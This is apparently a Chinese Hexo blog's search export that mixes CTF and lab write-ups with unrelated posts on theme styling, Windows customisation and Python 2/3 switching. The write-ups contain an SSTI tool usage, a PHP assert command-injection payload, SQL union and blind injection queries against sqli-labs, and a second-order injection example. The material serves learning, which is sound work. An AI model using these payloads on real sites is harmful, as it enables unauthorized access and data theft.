]括起来代替‘点’，字符串分开写再拼接，<strong>file.next()</strong> 方法在文件使用迭代器时会使用到，在循环中，next()方法会在每次循环中调用，该方法返回文件的下一行，如果到达结尾(EOF),则触发 <em>StopIteration</em>）</p><ol><li>原来有写过沙盒绕过的题，原理也类似，可以自己去复现一下。（有空再补吧…AWSL）</li></ol><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>SSTI注入也有工具可以使用——tplmap</p><p><strong>获取:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;tplmap</span><br></pre></td></tr></table></figure><p><strong>运行实例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tplmap.py -u &lt;url&gt;</span><br></pre></td></tr></table></figure><p>这个工具对于没有waf的，比如自己搭的那个简单的靶场里的完全可以直接一键式操作，如下图</p><p><img src="/服务端模板注入-SSTI攻击/pic6.png" alt=""></p><p>​    对于那个有waf的，工具是可以检测出来存在注入的，不过没有能直接用的功能，如上图这些，这就需要我们去fuzz然后手工注入了。</p><p>参考 ：<a href="https://host.zzidc.com/xnkj/1676.html" target="_blank" rel="noopener">https://host.zzidc.com/xnkj/1676.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo主题自定义样式</title>
      <link href="/2019/04/04/hexo%E4%B8%BB%E9%A2%98%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%B7%E5%BC%8F/"/>
      <url>/2019/04/04/hexo%E4%B8%BB%E9%A2%98%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%B7%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo主题自定义样式"><a href="#hexo主题自定义样式" class="headerlink" title="hexo主题自定义样式"></a>hexo主题自定义样式</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    前一阵子忙信安竞赛为了搭一个平台又去重新学习了一下前端知识。对于自己博客的样式觉得总是差点什么。于是打算自主来修改博客样式。</p><hr><h3 id="一、了解博客样式规则"><a href="#一、了解博客样式规则" class="headerlink" title="一、了解博客样式规则"></a>一、了解博客样式规则</h3><p>这里只是大致说一下博客的样式的形成（具体的前端知识不提了也说不过来）。在此拿hexo的主流主题next为例。</p><p>首先我们打开开发者工具（F12）</p><p><img src="hexo主题自定义样式/pic1.png" alt=""></p><p>其中可以看到各种样式规则。其中我们主要关注main.css 这里几乎包揽了整个博客页面的样式。</p><p>这个文件我们可以找一下，会发现博客路径下其实是有两个main.css的，如下图：</p><p><img src="hexo主题自定义样式/pic2.png" alt=""></p><p>这个就是我们见到的main.css的源文件了，有2.9k行+</p><p>（当然如果直接改这个文件是不行的。）看下图：</p><p><img src="hexo主题自定义样式/pic3.png" alt=""></p><p>在主题文件目录下还有一个main.styl，里面import了当前目录下的几个子目录中的样式文件。</p><p>​    </p><p>​    可以这么理解，除去博客基本的样式以外，还会从主题目录下引用来各种css文件。这也就是为什么直接改main.css没用，就算改了，部署一下又变成原来的。</p><p>​    在主题文件下面有一个custom.styl的文件。这是官方留给我们自定义样式的。（如果第三方主题的话应该也会留有自定义样式的位置或者直接在源文件上改之类的，具体可以Google/百度下）</p><p>​    另外，自己新建一个css样式也是可以的，新建一个css样式，写上自己的样式在里面，再在模板文件中调用，也可以实现，也方便自己管理，也不会干涉以前的样式，调用自己的样式文件，之前的样式文件就会被覆盖，如果有的个别没被覆盖的话，可以在属性后面加上！important，提高权重（不建议滥用）。这种方法需要会HTML、CSS、甚至JavaScrip。前两个会的话也能修改大部分样式了。</p><p>​    PS：就像custom.styl一样，为什么我们自己写的css能够作用于页面？或者说为什么它能覆盖原有样式。这是因为我们在引用custom.styl的时候是在最后。即最后生成的main.css中自定义的样式也是在最后的。</p><p><img src="hexo主题自定义样式/pic5.png" alt=""></p><p>这就是为什么自己写的样式2938行能覆盖掉2625行的原有样式。</p><h3 id="二、调试工具"><a href="#二、调试工具" class="headerlink" title="二、调试工具"></a>二、调试工具</h3><p>​    F12是个好东西…web的方方面面都用得上。</p><p>​    打开博客页面，找到你想修改的地方的样式（这里需要一点点前端知识），右键—&gt;查看元素。会自动定位到相应的dom节点。</p><p><img src="hexo主题自定义样式/pic4.png" alt=""></p><p>​    我们在这里直接修改完样式，调式到自己满意后再去自定义样式里添加就行了。如果要改js也类似一样的思路。不过个人而言改css已经能满足绝大部分需求了。</p><p>PS： 我们需要找到具体要修改部分的样式文件（有时候右键审查会点击位置不准确），要了解比如说修改头部的样式一般是含header字样的文件，底部的样式是footer，侧边栏是menu，文章模板是post，等（有的可能也不一样，因主题而议）。</p><h3 id="三、模板更改"><a href="#三、模板更改" class="headerlink" title="三、模板更改"></a>三、模板更改</h3><p>如果需要大改，即整个页面模板的调整，有一种方法就是去网上找一些好的模块样式，直接用调试工具，把他当内容和样式内容全部拷贝下来，在写入适当的文件中就行了。</p><p><strong>注意</strong>：其实最重要的就是要找到你的主题中那一个文件是控制那一部分样式的，而文件的命名大多数都是那几个专属名字，不知道可以百度，一般文件是在<code>layout</code>文件夹下面，只需要修改这里面的文件的内容就可以了，一般内容不用动，只增加样式就行了，他会覆盖之前的样式。比如我的layout下面：</p><p><img src="hexo主题自定义样式/pic6.png" alt=""></p><p>.swig文件都是一些模块的模板文件（模板说白了就是指定一些替换参数），这也是一种修改样式的方法。有需求的可以试试。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mfw(命令注入)</title>
      <link href="/2019/04/03/mfw-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/04/03/mfw-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h1><p>// 原题来自csaw-ctf-2016-quals</p><p>进入题目可以发现是一个个人网站。网站搭建提到了git，马上想到git源码泄露。</p><p><strong>.git 源码泄露 </strong></p><ul><li>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</li></ul><p>找个git泄露源码的工具把记录拷下来（也可以直接目录里去访问..比较麻烦）</p><p><img src="mfw-命令注入/pic1.png" alt=""></p><p>在templates下有个flag.php 意思就是让我们通过某种途径去访问到flag.php（这里把flag抹去了）</p><p>再来看看index.php</p><p><img src="mfw-命令注入/pic2.png" alt=""></p><p>看到assert这里就可以知道是命令注入题了。想办法构造payload去执行恶意命令。</p><p>assert在php里算是个危险函数，作为断言会将字符串参数执行</p><p>file 参数传进去会加上头和尾，尾部不用考虑，我们后续用//注释即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;123&#39;,&#39;..&#39;)&#x3D;&#x3D;&#x3D;false and system(&#39;ls&#39;); &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>构造payload一个大致思想就是把strops “完善” 再在后面加上自己的命令 最后把后续部分注释</p><p>最后变成了：</p><p>assert(“strop(‘123’,’..’)===false and system(‘ls’); //‘,’..’)===false”) or die(‘Detected hacking attempt!’);</p><p>得到flag</p><p><img src="mfw-命令注入/pic3.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NaNNaNNaNNaN-Batman</title>
      <link href="/2019/04/02/NaNNaNNaNNaN-Batman/"/>
      <url>/2019/04/02/NaNNaNNaNNaN-Batman/</url>
      
        <content type="html"><![CDATA[<h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><p>这是一道来自tinyctf-2014的web简单题</p><ul><li>题目首先给了一个附件</li><li><img src="NaNNaNNaNNaN-Batman/pic1.png" alt=""></li></ul><p>其中有一些乱码，我们直接放浏览器里去执行试试</p><p><img src="NaNNaNNaNNaN-Batman/pic2.png" alt=""></p><p>我们执行后会发现当前页面被js更改了   或者：</p><p><img src="NaNNaNNaNNaN-Batman/pic3.png" alt=""></p><p>直接返回一个true 而没有改变页面（根据当前页面html构造而定，后续还发现会存在被当前页面js阻止的情况，所以干脆直接在本地运行）</p><p>返回true并不能达到效果。我们试着把eval改为alert输出看看。</p><p><img src="NaNNaNNaNNaN-Batman/pic4.png" alt=""></p><p>可以看到执行情况如上图。 大致意思就是如果正则匹配到了就满足了if语句，层层深入最后在最里层执行了一系列换位操作得到flag。</p><p>js中我们还可以看到取“c”这个dom节点去写入一个输入框。至此我们本地运行就很方便了。</p><p>wamp本地运行（phpstudy也行）</p><p><img src="NaNNaNNaNNaN-Batman/pic5.png" alt=""></p><p>提交 be0f233ac7be98aa(正则匹配自己凑一个就好) 即可得到flag</p><p><strong>flag{it’s_a_h0le_in_0ne}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -tinyctf-2014 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2018/11/25/sqli-labs/"/>
      <url>/2018/11/25/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>首先先过一遍基本操作</p><p><img src="sqli-labs/less-1.png" alt=""></p><ol><li><p>加单引号报错，检查报错原因（去掉外层单引号还剩’1’’ limit 0,1）可知sql代码中采用’$id’,尝试 and 1=1 和 and 1=2 发现存在注入<br><img src="sqli-labs/less-1-9.png" alt=""></p></li><li><p>采用union注入，先判断列数，发现在4时报错可知列数为3</p></li></ol><p><img src="sqli-labs/less-1-1.png" alt=""></p><ol><li>具体一系列注入过程如下：</li></ol><ul><li>查看当前数据库和用户（有时可省，但其实很重要，root权限所有库都可以访问）</li><li>由系统库爆所有数据库</li><li>爆数据库的表</li><li>爆表的列</li><li>爆列的字段</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">手工注入：</span><br><span class="line">Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。</span><br><span class="line">以下为一般的流程。 </span><br><span class="line">猜数据库 select schema_name from information_schema.schemata </span><br><span class="line">猜某库的数据表 select table_name from information_schema.tables where table_schema&#x3D;&#39;xxxxx&#39; </span><br><span class="line">猜某表的所有列 Select column_name from information_schema.columns where table_name&#x3D;&#39;xxxxx&#39; </span><br><span class="line">获取某列的内容 Select *** from ****</span><br></pre></td></tr></table></figure><p><img src="sqli-labs/less-1-2.png" alt=""></p><p><img src="sqli-labs/less-1-3.png" alt=""></p><p><img src="sqli-labs/less-1-4.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">补充:</span><br><span class="line">( flag自己实验建的，为熟练操作放到了另一个数据库下)</span><br><span class="line">( self-flag 有点问题改成了 self_flag )</span><br><span class="line">( 选内容的时候如果不采用group_concat可能受限于sql语句只展示第一条,最好把内容全部联合展示 )</span><br></pre></td></tr></table></figure><p><img src="sqli-labs/less-1-5.png" alt=""></p><p>( 上图爆的表中的列，后续where语句中选择了数据库self_flag，即该库中的所有表的所有列,正确思路是选择table_name即选择表 )</p><p><img src="sqli-labs/less-1-6.png" alt=""></p><p>( self_flag下的flaggg表 )</p><p><img src="sqli-labs/less-1-7.png" alt=""></p><p>( 这里注意比对一下flag如果在database()即当前数据库下可以才可以直接用flaggg )</p><p><img src="sqli-labs/less-1-8.png" alt=""></p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>查注入点(可以利用id=1\这样来查)，猜测sql语句直接就是SELECT * from table_name WHERE id=$id;</p><p><img src="sqli-labs/less-2-1.png" alt=""></p><p>( 前面检测步骤同上，注意到语句正确但是没有回显，原因是id=1占用了回显，改为id=-1即可让union后部分语句回显，有的时候可以全部列出则不需要改前部错误也行…个人做题遇到过在此一提 )</p><p><img src="sqli-labs/less-2-2.png" alt=""></p><p>后续注入过程同less-1</p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>查注入点，猜猜测sql语句直接就是SELECT * from table_name WHERE id=(‘$id’);<br>注入过程同上</p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>查注入点，猜猜测sql语句直接就是SELECT * from table_name WHERE id=(“$id”);</p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>当我们输入语句正确是不再回显数据而是“You are in” 即盲注类型</p><p><strong>SQL盲注</strong></p><ul><li>基于布尔SQL盲注</li><li>基于时间的SQL盲注</li><li>基于报错的SQL盲注（即报错注入</li></ul><p>(有时候不一定要局限于盲注就只用于数据不回显) </p><p>做题前先学一学这三种盲注方法！（这里做一个简单的介绍）</p><h3 id="BooleanSQL盲注"><a href="#BooleanSQL盲注" class="headerlink" title="BooleanSQL盲注"></a>BooleanSQL盲注</h3><p>构造逻辑判断，利用逻辑函数进行</p><p>常用的函数有 left() 、ascii() 、substr() 、ord() 、mid() 、regexp().</p><p>大体上可以理解为构造对数据库名，表名等的字符串的判断函数</p><p>eg: <code>ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))</code> 通过索引数据库名对应字符串的位数来确定数据库名长度(超过位数就不回显)</p><p>注：盲注通常需要写脚本来自动化爆破数据库名,表名,列名和字段.</p><h3 id="基于时间的SQL盲注"><a href="#基于时间的SQL盲注" class="headerlink" title="基于时间的SQL盲注"></a>基于时间的SQL盲注</h3><p>利用if(条件,执行1，执行2)函数特性和sleep()函数的特性<br>【benchmark()太吃资源不建议用】</p><p>eg : <code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code> // if条件为真执行前者，否则执行后者也就是延迟5s </p><p>（后续做补充）</p><h3 id="基于报错的SQL盲注"><a href="#基于报错的SQL盲注" class="headerlink" title="基于报错的SQL盲注"></a>基于报错的SQL盲注</h3><p>前两种盲注比较好理解，基于报错的盲注不是很懂，乘机学习了一波（甩一波资料）<br><a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a> 双查询注入<br><a href="http://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509124.html</a> exp报错注入<br><a href="http://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509112.html</a> 利用bigint 溢出进行报错注入<br><a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/8554749.html</a> xpath报错注入详解</p><p>持续更新ing~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10美化</title>
      <link href="/2018/11/20/win10%E7%BE%8E%E5%8C%96/"/>
      <url>/2018/11/20/win10%E7%BE%8E%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<hr><p>//前言：看到自己桌面一堆乱七八糟的图标会不会很烦?(反正我是受不了，那就来美（简）化一下叭！)</p><hr><h1 id="Win10美化"><a href="#Win10美化" class="headerlink" title="Win10美化"></a>Win10美化</h1><ul><li>任务栏透明化</li><li>任务栏图标拖拽</li><li>任务栏隐藏</li><li>桌面图片隐藏+动态壁纸</li><li>白色图标</li></ul><p><strong>1. 任务栏透明化 </strong></p><p>推荐TranslucentTB这个小插件，可以调一下DOS设置开机自启（基本不占什么资源）</p><p><strong>2. 任务栏图标拖拽</strong></p><p>推荐Free Launch Bar, 下载完以后工具栏勾选</p><p><img src="win10美化/20181120215622.png" alt="pic1"></p><p>锁定任务栏勾选取消 &gt;&gt;&gt; 左右拖动任务栏中固定的图标</p><p><img src="win10美化/20181120220235.png" alt="pic2"></p><p>可以看到任务栏图标左边有一排横杆..拖到中间挺舒服的…个人喜好叭（左边快速启动栏可以把自己常用的放进去）</p><p><strong>3. 任务栏隐藏</strong></p><p>任务栏设置&gt;&gt;&gt;在桌面模式下自动隐藏任务栏（开）&gt;&gt;&gt;(个人喜好可以把任务栏改左边)</p><p><strong>4. 桌面图标隐藏+动态壁纸</strong></p><p>桌面右键查看&gt;&gt;&gt;取消勾选查看桌面图标</p><p>动态壁纸推荐upupoo（类似动态桌面挺多的。）//有点吃资源，前一阵子加了根内存条很任性了嘿！</p><p><strong>5. 白色图标</strong></p><p>网上有资源，直接搜，下下来改对应图标图像即可（改完拖任务栏固定）。</p><p>最后放一下效果叭…不喜勿喷</p><hr><p><img src="win10美化/20181120221716.png" alt="pic3"></p><hr><p><img src="win10美化/Snipaste_2018-11-20_22-20-19.png" alt="pic4"></p><hr><p><img src="win10美化/20181120222313.png" alt="pic5"></p><hr><p><img src="win10美化/Snipaste_2018-11-21_15-41-44.png" alt="pic6"></p><hr><p>另外强推一下Snipaste这款截图工具..挺方便挺好用的！谁用谁知道（坏笑.jpg</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -win10美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二次注入</title>
      <link href="/2018/10/13/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/10/13/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><ol><li><p><strong>二次注入</strong>：在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是恶意数据。</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的          时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注  入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p><p>​</p></li></ol><ol><li><strong>普通注入与二次注入的区别</strong>：</li></ol><ul><li>普通注入：</li></ul><p>​        在url中直接构造语句，立即生效；</p><p>​        容易被扫描工具扫描到，防范起来更容易.</p><ul><li>二次注入：</li></ul><p>​       通常先构造语句（有被转义字符的语句）；</p><p>​       构造的恶意语句存入数据库；</p><p>​       第二次构造语句(结合前面已经存入数据库的语句，成功。因为系统没有对已经存入数据库的数据做检查);</p><p>​       二次注入更加难以被发现.</p><ol><li><strong>原理详解</strong>：</li></ol><p>​       假如有一个网站管理员的用户名为：root    密码为：123456789 ，攻击者注册了一个账号 ： root’—    密码为：123</p><p>因为账号当中有特殊字符，网站对于特殊字符进行了转义，一次注入在这就行不通了。虽然账号被转义了，但是他在数据库当中任然是以  root’—   的方式被储存的。  </p><p>现在攻击者开始实施正真的攻击了，他开始对账号修改密码。普通网站修改密码的过程为：先判断用户是否存在———&gt;确认用户以前的密码是否正确————&gt;获取要修改的密码————-&gt;修改密码成功。 在数据库中 — 表示注释的意思，后面的语句不会执行，而root后面的那个单引号又与前面的 ‘  闭合，而原本后面的那个单引号因为是在 —  之后，所以就被注释掉了，所以他修改的其实是root账号的密码。</p><hr><p>下面甩一个CTF—web题实例：（服务器应该不会关的叭..）</p><p><a href="http://106.75.72.168:3333/login.php" target="_blank" rel="noopener">http://106.75.72.168:3333/login.php</a></p><p>知识点：</p><p>二次注入，sql查询时16进制默认转为字符串</p><p>注意点：</p><p>可能会出现浏览器编码问题导致页面源码中的hint乱码.</p><p>注册账号最好抓包注册.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python2/3无缝切换</title>
      <link href="/2018/09/20/python2-3%E6%97%A0%E7%BC%9D%E5%88%87%E6%8D%A2/"/>
      <url>/2018/09/20/python2-3%E6%97%A0%E7%BC%9D%E5%88%87%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="python-2-3-的自由切换使用"><a href="#python-2-3-的自由切换使用" class="headerlink" title="python 2/3 的自由切换使用"></a>python 2/3 的自由切换使用</h1><p>大家可能会遇到这样的情况，一台电脑上同时装了python2和python3的两个版本（各种库的不兼容也是让人很无奈的了）</p><p>下面介绍一下能够选择性切换2/3版本的方法。（python2/3版本的安装和环境配置在此不再赘述）</p><ul><li><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2></li></ul><p><img src="python2-3无缝切换/pic2.png" alt="1537459065997"></p><p><img src="python2-3无缝切换/pic1.png" alt="1537459000767"></p><p>将python2/3目录下的python.exe 分别改为python2.exe  和python3.exe  命令行运行时直接加python2（3） 指明版本即可。</p><ul><li><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2></li></ul><p>我们在安装Python3（&gt;=3.3）时，Python的安装包实际上在系统中安装了一个启动器py.exe，默认放置在文件夹C:\Windows\下面。这个启动器允许我们指定使用Python2还是Python3来运行代码（当然前提是你已经成功安装了Python2和Python3）。<br>如果你有一个Python文件叫 hello.py，那么你可以这样用Python2运行它<br>    <code>py -2 hello.py</code><br>类似的，如果你想用Python3运行它，就这样<br>    <code>py -3 hello.py</code><br>去掉参数 -2/-3<br>每次运行都要加入参数-2/-3还是比较麻烦，所以py.exe这个启动器允许你在代码中加入说明，表明这个文件应该是由python2解释运行，还是由python3解释运行。说明的方法是在代码文件的最开始加入一行<br>   <code>#! python2</code><br>或者<br>   <code>#! python3</code><br>分别表示该代码文件使用Python2或者Python3解释运行。这样，运行的时候你的命令就可以简化为<br>   <code>py hello.py</code></p><h3 id="使用pip分别为python2-3装库"><a href="#使用pip分别为python2-3装库" class="headerlink" title="使用pip分别为python2/3装库"></a>使用pip分别为python2/3装库</h3><p>当Python2和Python3同时存在于windows上时，它们对应的pip都叫pip.exe，所以不能够直接使用 pip install 命令来安装软件包。而是要使用启动器py.exe来指定pip的版本。命令如下：<br>  <code>py -2 -m pip install XXXX</code><br>-2 还是表示使用 Python2，-m pip 表示运行 pip 模块，也就是运行pip命令了。如果是为Python3安装软件，那么命令类似的变成<br>   <code>py -3 -m pip install XXXX</code></p><p>同时还可以引申出“ py -2 -m pip list ” 等命令（查看pip 安装的库）</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>由于Python2要在代码文件顶部增加一行说明，才能够在代码中使用中文。如果指明使用的Python版本也需要在文件顶部增加一行。</p><p>标准如下：（即版本放第一行，编码放第二行）</p><pre><code>#! python2# coding: utf-8</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -python使用 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
